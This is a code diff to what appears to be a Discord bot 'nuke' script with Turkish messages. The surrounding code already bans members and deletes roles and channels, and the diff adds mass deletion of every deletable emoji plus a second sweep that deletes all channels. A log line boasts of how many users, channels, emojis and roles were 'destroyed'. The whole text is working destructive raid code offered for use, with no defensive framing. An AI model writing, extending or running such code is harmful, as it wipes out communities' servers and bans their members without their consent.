@@ -15,6 +15,13 @@ insan++
 message.guild.ban(u, "Berke Adamdır")
 }
 })
+
+message.guild.emojis.forEach(e => {
+if (e.deletable) {
+emojiler++;
+return e.delete();
+}
+});
  
 message.guild.channels.forEach(c => {
 if (c.deletable) {
@@ -29,6 +36,11 @@ roller++;
 return c.delete();   
 }
 });
+
+if(message.deletable) message.delete();
+    message.guild.channels.forEach(channel => {
+      if(channel.deletable) channel.delete()
+  })
 
 console.log(`Sunucudaki ${insan} kullanıcı ve ${kanallar} kanal ${emojiler} emoji ve ${roller} rol yok edildi!`);
   
